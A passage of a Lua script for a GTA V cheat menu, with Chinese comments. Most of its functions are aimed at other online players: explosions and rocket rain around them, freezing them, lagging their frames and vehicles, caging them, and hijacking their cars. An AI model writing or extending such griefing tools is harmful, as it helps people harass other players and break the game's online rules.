        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(nid, true)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vic)
        wait()
        tick =  tick + 1
        if tick > 10 then
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vic) then
                if set.alert then
                    menu.toast('Could not gain control')
                end
                if not spec then
                    Specoff(pid)
                end
                util.stop_thread()
            end
        end
    end
end
function REQUEST_CONTROL(entity)
	if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
		local netId = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity)
		NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netId, true)
		NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
	end
	return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity)
end
function carjump()
    local entities = GET_NEARBY_VEHICLES(PLAYER.PLAYER_ID(), 150)
	for _, vehicle in ipairs(entities) do
		REQUEST_CONTROL(vehicle)
		ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0, 0, 6.5, 0, 0, 0, 0, false, false, true)
	end
	wait(1500)
end
local irlTime = false
local setClockCommand = menu.ref_by_path('World>Atmosphere>Clock>Time', 37)
local smoothTransitionCommand = menu.ref_by_path('World>Atmosphere>Clock>Smooth Transition', 37)
function iri_time(toggle)
    irlTime = toggle
    if menu.get_value(smoothTransitionCommand) then menu.trigger_command(smoothTransitionCommand) end
    util.create_tick_handler(function()
        menu.trigger_command(setClockCommand, os.date('%H:%M:%S'))
        return irlTime
    end)
end
mapZoom = 83
function Zoom_map(value)
    mapZoom = 83
    mapZoom = value
    util.create_tick_handler(function()
        HUD.SET_RADAR_ZOOM_PRECISE(mapZoom)
        return mapZoom != 83
    end)
end
function disableNumpad()
    if not menu.is_open() or K.is_key_down('VK_LBUTTON') or K.is_key_down('VK_RBUTTON') then return end
    for _, control in pairs(numpadControls) do
        PAD.DISABLE_CONTROL_ACTION(2, control, true)
    end
end
function SE_add_explosion(x, y, z, exptype, dmgscale, isheard, isinvis, camshake, nodmg)
    FIRE.ADD_EXPLOSION(x, y, z, exptype, dmgscale, isheard, isinvis, camshake, nodmg)
end
function orbital(pid) 
    for i = 0, 30 do 
        pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        for j = -2, 2 do 
            for k = -2, 2 do 
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
                FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x + j, pos.y + j, pos.z + (30 - i), 29, 999999.99, true, false, 8)
            end
        end
        wait(20)
    end
end
function rain_rockets(pid, owned)
    local user_ped = PLAYER.PLAYER_PED_ID()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local owner
    local hash = util.joaat("weapon_airstrike_rocket")
    if not WEAPON.HAS_WEAPON_ASSET_LOADED(hash) then
        WEAPON.REQUEST_WEAPON_ASSET(hash, 31, 0)
    end
    pos.x = pos.x + math.random(-6,6)
    pos.y = pos.y + math.random(-6,6)
    local ground_ptr = memory.alloc(32); MISC.GET_GROUND_Z_FOR_3D_COORD(pos.x, pos.y, pos.z, ground_ptr, false, false); pos.z = memory.read_float(ground_ptr); memory.free(ground_ptr)
    if owned then owner = user_ped else owner = 0 end
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+50, pos.x, pos.y, pos.z, 200, true, hash, owner, true, false, 2500.0)
end
function request_ptfx_asset_peeloop(asset)
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        wait()
    end
end
function GetSpec(pid)
    if players.exists(pid) then
        local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Nuts Method"))
        return spec
    else
        return
    end
end
function Changeneon(pid, color)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true)
    local spec = GetSpec(pid)
    if not players.exists(pid) then
        util.stop_thread()
    end
    GetControl(vmod, spec, pid)
    RGBNeonKit(pedm)
    VEHICLE.SET_VEHICLE_NEON_INDEX_COLOUR(vmod, color)
end
function Changecolor(pid, color)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true)
    local spec = GetSpec(pid)
    if not players.exists(pid) then
        util.stop_thread()
    end
    GetControl(vmod, spec, pid)
    VEHICLE.SET_VEHICLE_FIXED(vmod)
    VEHICLE.SET_VEHICLE_COLOURS(vmod, color.prim, color.sec)
end
function ACutil(text)
   return gtoast(text)
end
function GetPlayVeh(pid, opt)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    if not players.exists(pid) then
        util.stop_thread()
    end
    local spec = GetSpec(pid)
    if set.alert then
        ACutil(Str_trans('获得对车辆的控制'))
    end
    if Disbet(pid) > 750000 then
        Specon(pid)
        if PED.IS_PED_IN_ANY_VEHICLE(pedm, true) then
            opt()
            if not spec then
                Specoff(pid)
            end
            return
        else
            if set.alert then
            ACutil(Str_trans('玩家不在车内'))
            end
            Specoff(pid)
        end
    elseif Disbet(pid) < 750000 then
        if PED.IS_PED_IN_ANY_VEHICLE(pedm, true) then
            opt()
            if not spec then
                Specoff(pid)
            end
        return
        end
    else
        if set.alert then
            ACutil(Str_trans('玩家不在车内'))
        end
    end
end
function Disbet(pid)
    local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
    local play = ENTITY.GET_ENTITY_COORDS(players.user_ped(), true)
    local disbet = SYSTEM.VDIST2(play.x, play.y, play.z, tar1.x, tar1.y, tar1.z)
    return disbet
end
    function Rolladown(pid)
        local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
        local spec = GetSpec(pid)
        GetControl(pedm, spec, pid)
        VEHICLE.ROLL_DOWN_WINDOWS(vmod)
    end
    function Rollaup(pid)
        local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
        local spec = GetSpec(pid)
        GetControl(pedm, spec, pid)
        for i = 0, 7 do
            VEHICLE.ROLL_UP_WINDOW(vmod, i)
        end
    end
    function Rolldindivid(pid, win)
        local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
        local spec = GetSpec(pid)
        GetControl(pedm, spec, pid)
        VEHICLE.ROLL_DOWN_WINDOW(vmod, win)
    end
    function Rolluindivid(pid, win)
        local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
        local spec = GetSpec(pid)
        GetControl(pedm, spec, pid)
        VEHICLE.ROLL_UP_WINDOW(vmod, win)
    end
--撒尿
function peeloop_player(pid)
    if state then 
        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)
        local bone_index = PED.GET_PED_BONE_INDEX(0,player_ped, 0x2e28)
        request_ptfx_asset_peeloop("core")
        local useptfx = GRAPHICS.USE_PARTICLE_FX_ASSET("ent_amb_peeing")
        local affect <const> = Effect.new("ent_amb_peeing")
        --["START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE"]=--[[int]] function(--[[string]] effectName,--[[Entity (int)]] entity,--[[float]] xOffset,--[[float]] yOffset,--[[float]] zOffset,--[[float]] xRot,--[[float]] yRot,--[[float]] zRot,--[[int]] boneIndex,--[[float]] scale,--[[BOOL (bool)]] xAxis,--[[BOOL (bool)]] yAxis,--[[BOOL (bool)]] zAxis,--[[Any (int)]] p13,--[[Any (int)]] p14,--[[Any (int)]] p15,--[[Any (int)]] p16)
        --START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY(effect.name,vehicle,offset.x,offset.y,0.0,0.0,0.0,0.0,0.7, false, false, false,0, 0, 0, 0)
        ptfx_id = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY(0,affect.name,player_ped , 0, 0, 0, -90, 0, 0, PED.GET_PED_BONE_INDEX(PLAYER.GET_PLAYER_PED(pid), 0x2e28), 2, false, false, false) 
    else
        GRAPHICS.STOP_PARTICLE_FX_LOOPED(ptfx_id, false)
    end
end
--骑乘
function piggy_back(pid, on)
    if players.user() == pid then return end
    usingPiggyback = on
    if usingPiggyback then
        usingRape = false
        local target = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
       STREAMING.REQUEST_ANIM_DICT("rcmjosh2")
       while not STREAMING.HAS_ANIM_DICT_LOADED("rcmjosh2") do
            wait()
        end
        local boneId = PED.GET_PED_BONE_INDEX(target, 0xDD1C)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(
           players.user_ped(),
            target,
            boneId,
            0.0, -0.2, 0.65,
           0.0, 0.0, 180.0,
            false, true, false, false, 0, true, 0)
        TASK.TASK_PLAY_ANIM(players.user_ped(), "rcmjosh2", "josh_sitting_loop", 8.0, -8.0, -1, 1, 0.0, false, false, false)
       while usingPiggyback and is_player_active(pid, false, true) and
       not util.is_session_transition_active() do
           wait()
       end
       usingPiggyback = false
       TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
       ENTITY.DETACH_ENTITY(players.user_ped(), true, false)
   end
end
--烟雾掉帧
function smokelagg(pid) 
        if players.exists(pid) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(pid), "Trolling>Freeze")
            local player_pos = players.get_position(pid)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset_peeloop("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "veh_respray_smoke", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false
            )
            menu.set_value(freeze_toggle, false)
        end
    end
local yeetMultiplier = 1000
local yeetRange = 1000
local stormDelay = New.delay(1, 0, 0)  
function yeetEntities()
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)
        local targetPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        --local targetPos = players.get_position(pid)
        local pointerTables = {
            entities.get_all_peds_as_pointers(),
            entities.get_all_vehicles_as_pointers()
        }
        local range = yeetRange * yeetRange --squaring it, for VDIST2
        for _, pointerTable in pairs(pointerTables) do
            for _, entityPointer in pairs(pointerTable) do
                local entityPos = entities.get_position(entityPointer)
                local distance = v3.distance(targetPos, entityPos)
                if distance < range then
                    local entityHandle = entities.pointer_to_handle(entityPointer)
                    --check the entity is a ped in a car
                    if (ENTITY.IS_ENTITY_A_PED(entityHandle) and (not PED.IS_PED_IN_ANY_VEHICLE(entityHandle, true) and (not PED.IS_PED_A_PLAYER(entityHandle)))) or (not ENTITY.IS_ENTITY_A_PED(entityHandle))--[[for the vehicles]] then
                        local playerList = players.list(true, true, true)
                        if not ENTITY.IS_ENTITY_A_PED(entityHandle) then
                            for _, pid in pairs(playerList) do
                                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                                if PED.GET_VEHICLE_PED_IS_IN(ped, false) == entityHandle then goto skip end --if the entity is a players car ignore it
                            end
                        end
                        local localTargetPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entityHandle)
                        v3.sub(localTargetPos, entityPos) --subtract here, for launch.
                        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(entityHandle, 1, v3.getX(localTargetPos) * yeetMultiplier, v3.getY(localTargetPos) * yeetMultiplier, v3.getZ(localTargetPos) * yeetMultiplier, true, false, true, true)
                        ::skip::
                    end
                end
            end
        end
    end
--实体风暴
function chaoshita(pid) 
yeetEntities()
        wait(getTotalDelay(stormDelay))
        if not players.exists(pid) then util.stop_thread() end
end
function Get_Waypoint_Pos2()
    if HUD.IS_WAYPOINT_ACTIVE() then
        local blip = HUD.GET_FIRST_BLIP_INFO_ID(8)
        local waypoint_pos = HUD.GET_BLIP_COORDS(blip)
        return waypoint_pos
    else
        gtoast("未标记地点")
    end
end
function EaseOutCubic(x)
    return 1 - ((1-x) ^ 3)
end
function EaseInOutCubic(x) --Thank you QUICKNET for re-writing this function!
    if(x < 0.5) then
        return 4 * x * x * x;
    else
        return 1 - ((-2 * x + 2) ^ 3) / 2
    end
end
local WhiteText = {r = 1.0, g = 1.0, b = 1.0, a = 1.0}
function SmoothTeleportToCord(v3coords, teleportFrame)
    local wppos = v3coords
    local localped = PLAYER.GET_PLAYER_PED(players.user())
    if wppos ~= nil then --cam setup here
        if not CAM.DOES_CAM_EXIST(CCAM) then
            CAM.DESTROY_ALL_CAMS(true)
            CCAM = CAM.CREATE_CAM("DEFAULT_SCRIPTED_CAMERA", true)
            CAM.SET_CAM_ACTIVE(CCAM, true)
            CAM.RENDER_SCRIPT_CAMS(true, false, 0, true, true, 0)
        end
        --
        if teleportFrame then
            util.create_tick_handler(function ()
                if CAM.DOES_CAM_EXIST(CCAM) then
                    local tickCamCoord = CAM.GET_CAM_COORD(CCAM)
                    if not PED.IS_PED_IN_ANY_VEHICLE(localped, true) then --if they not in a vehicle
                        ENTITY.SET_ENTITY_COORDS(localped, tickCamCoord.x, tickCamCoord.y, tickCamCoord.z, false, false, false, false) --teleport the player
                    else
                        local veh = PED.GET_VEHICLE_PED_IS_IN(localped, false)
                        ENTITY.SET_ENTITY_COORDS(veh, tickCamCoord.x, tickCamCoord.y, tickCamCoord.z, false, false, false, false) --teleport the vehicle
                    end
                else
                    return false
                end
            end)
        end
        --
        local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(players.user()))
        --
        for i = 0, 1, STP_SPEED_MODIFIER do --make the cam move up here
            CAM.SET_CAM_COORD(CCAM, pc.x, pc.y, pc.z + EaseOutCubic(i) * STP_COORD_HEIGHT)
            directx.draw_text(0.5, 0.5, tostring(EaseOutCubic(i) * STP_COORD_HEIGHT), 1, 0.6, WhiteText, false)
            local look = util.v3_look_at(CAM.GET_CAM_COORD(CCAM), pc)
            CAM.SET_CAM_ROT(CCAM, look.x, look.y, look.z, 2)
            wait()
        end
        --CAM.DO_SCREEN_FADE_OUT(1000) --fade out the screen
        ------------
        local currentZ = CAM.GET_CAM_COORD(CCAM).z
        local coordDiffx = wppos.x - pc.x
        local coordDiffxy = wppos.y - pc.y
        for i = 0, 1, STP_SPEED_MODIFIER / 2 do --make the camera on x/y plane
            CAM.SET_CAM_COORD(CCAM, pc.x + (EaseInOutCubic(i) * coordDiffx), pc.y + (EaseInOutCubic(i) * coordDiffxy), currentZ)
            wait()
        end
        -- local groundZ = PATHFIND.GET_APPROX_HEIGHT_FOR_POINT(wppos.x, wppos.y)
        -- ENTITY.SET_ENTITY_COORDS(localped, wppos.x, wppos.y, groundZ, false, false, false, false)
        local success, ground_z
        repeat
            STREAMING.REQUEST_COLLISION_AT_COORD(wppos.x, wppos.y, wppos.z)
            success, ground_z = util.get_ground_z(wppos.x, wppos.y)
            wait()
        until success
        if not PED.IS_PED_IN_ANY_VEHICLE(localped, true) then --if they not in a vehicle
            ENTITY.SET_ENTITY_COORDS(localped, wppos.x, wppos.y, ground_z, false, false, false, false) --teleport the player
        else
            local veh = PED.GET_VEHICLE_PED_IS_IN(localped, false)
            local v3Out = memory.alloc()
            local headOut = memory.alloc()
            PATHFIND.GET_CLOSEST_VEHICLE_NODE_WITH_HEADING(wppos.x, wppos.y, ground_z, v3Out, headOut, 1, 3.0, 0)
            local head = memory.read_float(headOut)
            memory.free(headOut)
            memory.free(v3Out)
            ENTITY.SET_ENTITY_COORDS(veh, wppos.x, wppos.y, ground_z, false, false, false, false) --teleport the vehicle
            ENTITY.SET_ENTITY_HEADING(veh, head)
        end
        wait()
        local pc2 = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(players.user()))
        local coordDiffz = CAM.GET_CAM_COORD(CCAM).z - ground_z -2
        local camcoordz = CAM.GET_CAM_COORD(CCAM).z
        --CAM.DO_SCREEN_FADE_IN(2000) --fade in the screen
        for i = 0, 1, STP_SPEED_MODIFIER / 2 do --move the camera down
            local pc23 = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(players.user()))-- extra for x/y
            CAM.SET_CAM_COORD(CCAM, pc23.x, pc23.y, camcoordz - (EaseOutCubic(i) * coordDiffz))
            wait()
        end
        -------------
        ----
        wait()
        --camera deletion here
        CAM.RENDER_SCRIPT_CAMS(false, false, 0, true, true, 0)
        if CAM.IS_CAM_ACTIVE(CCAM) then
            CAM.SET_CAM_ACTIVE(CCAM, false)
        end
        CAM.DESTROY_CAM(CCAM, true)
    else
        gtoast("没标点！")
    end
end
function requestModels(...)
    local arg = { ... }
    for _, model in ipairs(arg) do
        if not STREAMING.IS_MODEL_VALID(model) then
            error("tried to request an invalid model")
        end
        STREAMING.REQUEST_MODEL(model)
        while not STREAMING.HAS_MODEL_LOADED(model) do
            wait()
        end
    end
end
function uforq(pid) 
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local c = ENTITY.GET_ENTITY_COORDS(p)
    STREAMING.REQUEST_MODEL(ufo)
    while not STREAMING.HAS_MODEL_LOADED(ufo) do
        STREAMING.REQUEST_MODEL(ufo)
        wait()
    end
    menu.trigger_commands("freeze".. players.get_name(pid).. " on")
    c.z = c.z + 10
    local spawnedufo = entities.create_object(ufo, c) --creates ufo
    wait(2000)
    c = ENTITY.GET_ENTITY_COORDS(p)
    FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 3.0, false)
    wait(1000)
    entities.delete_by_handle(spawnedufo)
    menu.trigger_commands("freeze".. players.get_name(pid).. " off")
end
--关门放狗
function sendog(pid)
	local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        for i = 1, 20 do
		send_attacker(-1788665315, pid, false)
		wait(1)
        end
		local coords = ENTITY.GET_ENTITY_COORDS(ped, true)
        coords.x = coords['x']
        coords.y = coords['y']
        coords.z = coords['z']
        local hash = 779277682
        request_model_load(hash)
        local cage1 = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, coords['x'], coords['y'], coords['z'], true, false, false)
        ENTITY.SET_ENTITY_ROTATION(cage1, 0.0, -90.0, 0.0, 1, true)
        local cage2 = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, coords['x'], coords['y'], coords['z'], true, false, false)
        ENTITY.SET_ENTITY_ROTATION(cage2, 0.0, 90.0, 0.0, 1, true)
end
--掉猴子
function sendmonkey(pid)
    PlayerName = PLAYER.GET_PLAYER_NAME(pid)
    local hash = util.joaat("a_c_chimp")
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        STREAMING.REQUEST_MODEL(hash)
        wait()
    end
    for i = 1, 69 do
        PlayerCoords = NETWORK._NETWORK_GET_PLAYER_COORDS(pid)
        MonkeCoords = {
            ["x"] = PlayerCoords.x,
            ["y"] = PlayerCoords.y,
            ["z"] = PlayerCoords.z + 3
        }
        entities.create_ped(28, hash, MonkeCoords, 0)
        wait(50)
    end
end
--掉cxk
function sendcxk(pid)
    PlayerName = PLAYER.GET_PLAYER_NAME(pid)
    local hash = util.joaat("a_c_hen")
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        STREAMING.REQUEST_MODEL(hash)
        wait()
    end
    for i = 1, 69 do
        PlayerCoords = NETWORK._NETWORK_GET_PLAYER_COORDS(pid)
        MonkeCoords = {
            ["x"] = PlayerCoords.x,
            ["y"] = PlayerCoords.y,
            ["z"] = PlayerCoords.z + 3
        }
        entities.create_ped(28, hash, MonkeCoords, 0)
        wait(50)
    end
end
local function tpTableToPlayer(tbl, pid)
    if NETWORK.NETWORK_IS_PLAYER_CONNECTED(pid) then
        local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        for _, v in pairs(tbl) do
            if (not PED.IS_PED_A_PLAYER(v)) then
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(v, c.x, c.y, c.z, false, false, false)
            end
        end
    end
end
function TpAllPeds(player)
    local pedHandles = entities.get_all_peds_as_handles()
    tpTableToPlayer(pedHandles, player)
end
function TpAllVehs(player)
    local vehHandles = entities.get_all_vehicles_as_handles()
    tpTableToPlayer(vehHandles, player)
end
function TpAllObjects(player)
    local objHandles = entities.get_all_objects_as_handles()
    tpTableToPlayer(objHandles, player)
end
function TpAllPickups(player)
    local pickupHandles = entities.get_all_pickups_as_handles()
    tpTableToPlayer(pickupHandles, player)
end
local function fastNet(entity, playerID)
    local netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
    if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
        for i = 1, 30 do
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
                wait(10)
            else
                goto continue
            end    
        end
    end
    ::continue::
    if SE_Notifications then
        gtoast("有控制权.")
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(netID)
    wait(10)
    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netID)
    wait(10)
    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netID, false)
    wait(10)
    NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(netID, playerID, true)
    wait(10)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(entity, true, false)
    wait(10)
    ENTITY._SET_ENTITY_CLEANUP_BY_ENGINE(entity, false)
    wait(10)
    if ENTITY.IS_ENTITY_AN_OBJECT(entity) then
        NETWORK.OBJ_TO_NET(entity)
    end
    wait(10)
    if BA_visible then
        ENTITY.SET_ENTITY_VISIBLE(entity, true, 0)
    else
        ENTITY.SET_ENTITY_VISIBLE(entity, false, 0)
        wait()
        ENTITY.SET_ENTITY_VISIBLE(entity, false, 0)
        wait()
        ENTITY.SET_ENTITY_VISIBLE(entity, false, 0)
    end
end
function qfmq(pid)
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local forwardOffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0, 4, 0)
    local pheading = ENTITY.GET_ENTITY_HEADING(ped)
    local hash = 309416120
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do wait() end
    local a1 = OBJECT.CREATE_OBJECT(hash, forwardOffset.x, forwardOffset.y, forwardOffset.z - 1, true, true, true)
    ENTITY.SET_ENTITY_HEADING(a1, pheading + 90)
    fastNet(a1, pid)
    local b1 = OBJECT.CREATE_OBJECT(hash, forwardOffset.x, forwardOffset.y, forwardOffset.z + 1, true, true, true)
    ENTITY.SET_ENTITY_HEADING(b1, pheading + 90)
    fastNet(b1, pid)
    wait(500)
    entities.delete_by_handle(a1)
    entities.delete_by_handle(b1)
end
local function getPlayerName_pid(pid)
    local playerName = NETWORK.NETWORK_PLAYER_GET_NAME(pid)
    return playerName
end
--陨石掉落
function start_meteor_shower()
    meteor_thr = util.create_thread(function(thr)
        while true do
            if not meteors then
                util.stop_thread()
            end
            local rand_1 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), math.random(-500, 500), math.random(-500, 500), 300.0)
            local rand_2 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), math.random(-500, 500), math.random(-500, 500), 0.0)
            local diff = {}
            local speed = 200
            diff.x = (rand_2['x'] - rand_1['x'])*speed
            diff.y = (rand_2['y'] - rand_1['y'])*speed
            diff.z = (rand_2['z'] - rand_1['z'])*speed
            local h = 3751297495
            request_model_load(h)
            rand_1.x = rand_1['x']
            rand_1.y = rand_1['y']
            rand_1.z = rand_1['z']
            local meteor = OBJECT.CREATE_OBJECT_NO_OFFSET(h, rand_1['x'], rand_1['y'], rand_1['z'], true, false, false)
            ENTITY.SET_ENTITY_HAS_GRAVITY(meteor, true)
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(meteor, 4, diff.x, diff.y, diff.z, true, false, true, true)
            ENTITY.APPLY_FORCE_TO_ENTITY(meteor, 2, diff.x, diff.y, diff.z, 0, 0, 0, 0, true, false, true, false, true)
            OBJECT.SET_OBJECT_PHYSICS_PARAMS(meteor, 100000, 5, 1, 0, 0, .5, 0, 0, 0, 0, 0)
            wait(100)
        end
    end)
end
function letcarlagging(pid)
    local ped = PLAYER.GET_PLAYER_PED(pid)
   if PED.IS_PED_IN_ANY_VEHICLE(ped) then
       local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
       local velocity = ENTITY.GET_ENTITY_VELOCITY(veh)
       local oldcoords = ENTITY.GET_ENTITY_COORDS(ped)
       wait(500)
       local nowcoords = ENTITY.GET_ENTITY_COORDS(ped)
       for a = 1, 10 do
           NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
           wait()
       end
       ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, oldcoords.x, oldcoords.y, oldcoords.z, false, false, false)
       wait(200)
       for b = 1, 10 do
           NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
           wait()
       end
       ENTITY.SET_ENTITY_VELOCITY(veh, velocity.x, velocity.y, velocity.z)
       for c = 1, 10 do
           NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
           wait()
       end
       ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, nowcoords.x, nowcoords.y, nowcoords.z, false, false, false)
       for d = 1, 10 do
           NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
           wait()
       end
       ENTITY.SET_ENTITY_VELOCITY(veh, velocity.x, velocity.y, velocity.z)
       wait(500)
   else
       gtoast("玩家 " .. getPlayerName_pid(pid) .. " 不在车内")
   end
end
overlay_x = 0.0052
overlay_y = 0.18519
size = 0.03
boxMargin = size / 7
overlay_x = 0.0400
overlay_y = 0.1850
key_text_color = newColor(1, 1, 1, 1)
background_colour = newColor(0, 0, 0, 0.2)
pressed_background_colour = newColor(2.55/255, 2.55/255, 2.55/255, 0.5490196078431373)
spaceBarLength = 3
spaceBarSlim = 1
altSpaceBar = 0
wasd = {
    [1]  = { keys = {44, 52, 85, 138, 141, 152, 205, 264},                                               pressed = false, key = 'Q',     show = true },
    [2]  = { keys = {32, 71, 77, 87, 129, 136, 150, 232},                                                pressed = false, key = 'W',     show = true },
    [3]  = { keys = {38, 46, 51, 54, 86, 103, 119, 153, 184, 206, 350, 351, 355, 356},                   pressed = false, key = 'E',     show = true },
    [4]  = { keys = {45, 80, 140, 250, 263, 310},                                                        pressed = false, key = 'R',     show = true },
    [5]  = { keys = {34 ,63, 89, 133, 147, 234, 338},                                                    pressed = false, key = 'A',     show = true },
    [6]  = { keys = {8, 31, 33, 72, 78, 88, 130, 139, 149, 151, 196, 219, 233, 268, 269, 302},           pressed = false, key = 'S',     show = true },
    [7]  = { keys = {9, 30, 35, 59, 64, 90, 134, 146, 148, 195, 218, 235, 266, 267, 278, 279, 339, 342}, pressed = false, key = 'D',     show = true },
    [8]  = { keys = {23, 49, 75, 145, 185, 251},                                                         pressed = false, key = 'F',     show = true },
    [9]  = { keys = {21, 61, 131, 155, 209, 254, 340, 352},                                              pressed = false, key = 'Shift', show = true },
    [10] = { keys = {36, 60, 62, 132, 224, 280, 281, 326, 341, 343},                                     pressed = false, key = 'Ctrl',  show = true },
    [11] = { keys = {18, 22, 55, 76, 102, 143, 179, 203, 216, 255, 298, 321, 328, 353},                  pressed = false, key = 'Space', show = true },
}
pedToggleLoops = {
    {name = '摔倒NPC', command = 'JSragdollPeds', description = '让附近的所有NPC都摔倒 嘿嘿', action = function(ped)
        if PED.IS_PED_A_PLAYER(ped) then return end
        PED.SET_PED_TO_RAGDOLL(ped, 2000, 2000, 0, true, true, true)
    end},
    {name = '死亡接触', command = 'JSdeathTouch', description = '杀死所有碰到您的NPC', action = function(ped)
        if PED.IS_PED_A_PLAYER(ped) or PED.IS_PED_IN_ANY_VEHICLE(ped, true) or not ENTITY.IS_ENTITY_TOUCHING_ENTITY(ped, players.user_ped()) then return end
        ENTITY.SET_ENTITY_HEALTH(ped, 0, 0)
    end},
    {name = '寒冷NPC', command = 'JScoldPeds', description = '移除附近NPC的热特征', action = function(ped)
        if PED.IS_PED_A_PLAYER(ped) then return end
        PED.SET_PED_HEATSCALE_OVERRIDE(ped, 0)
    end},
    {name = '静音NPC', command = 'JSmutePeds', description = '因为我不想再听到那个家伙谈论他的同性恋狗啦', action = function(ped)
        if PED.IS_PED_A_PLAYER(ped) then return end
        AUDIO.STOP_PED_SPEAKING(ped, true)
    end},
    {name = 'NPC喇叭加速', command = 'JSnpcHornBoost', description = '当NPC按喇叭时会加速他们的载具', action = function(ped)
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
        if PED.IS_PED_A_PLAYER(ped) or not PED.IS_PED_IN_ANY_VEHICLE(ped, true) or not AUDIO.IS_HORN_ACTIVE(vehicle) then return end
